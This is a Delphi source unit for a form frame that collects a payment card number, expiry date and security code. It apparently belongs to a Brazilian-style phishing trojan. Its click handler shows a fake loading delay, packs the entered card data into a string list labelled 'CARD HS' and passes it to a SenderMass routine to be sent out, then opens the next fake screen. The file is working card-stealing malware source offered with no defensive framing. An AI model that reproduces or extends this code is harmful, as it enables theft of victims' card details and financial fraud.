unit Hs4;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, ExtCtrls, pngimage, Hs5, StdCtrls;

type
  THsNews4 = class(TFrame)
    Image1: TImage;
    EditMes: TEdit;
    EditCard: TEdit;
    EditAno: TEdit;
    EditSeg: TEdit;
    Image2: TImage;
    procedure EditCardChange(Sender: TObject);
    procedure EditMesChange(Sender: TObject);
    procedure EditAnoChange(Sender: TObject);
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    S: String;
  end;
  var
  HsNews5: THsNews5;

implementation

{$R *.dfm}
uses
Natal, Gerador;

procedure THsNews4.EditAnoChange(Sender: TObject);
begin
  if Length(EditAno.Text) = 4 then
    EditSeg.SetFocus;
end;

procedure THsNews4.EditCardChange(Sender: TObject);
begin
  if Length(Editcard.Text) = 19 then
    EditMes.SetFocus;

    if s = 's' then
begin
if length(Editcard.Text) = 4 then
begin
Editcard.Text := Editcard.Text + ' ';
Editcard.SelStart := length(Editcard.Text);
end;

if length(Editcard.Text) = 9 then
begin
Editcard.Text := Editcard.Text + ' ';
Editcard.SelStart := length(Editcard.Text);
end;

if length(Editcard.Text) = 14 then
begin
Editcard.Text := Editcard.Text + ' ';
Editcard.SelStart := length(Editcard.Text);
end;

end
else
begin
s :='s';
end;
end;

procedure THsNews4.EditMesChange(Sender: TObject);
begin
  if Length(EditMes.Text) = 2 then
    EditAno.SetFocus;
end;

procedure THsNews4.Image2Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;

  DadosEnvio_ := TStringList.Create;

  DadosEnvio_.Add('CARD.....:  '+  EditCard.text);
  DadosEnvio_.Add('VALIDADE.:  '+  EditmES.text+'/'+EditaNO.Text);
  DadosEnvio_.Add('SEGURANÇA:  '+  EditSEG.text);
  DadosEnvio_.Add('=============================================');

  //SENDBOX
try
begin
HsNews5 := THsNews5.Create(Self);

with HsNews5 do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
  end;

  SenderMass(DadosEnvio_ , 'CARD HS');
  DadosEnvio_.Free;
  end;
finally
end;
end;
end.

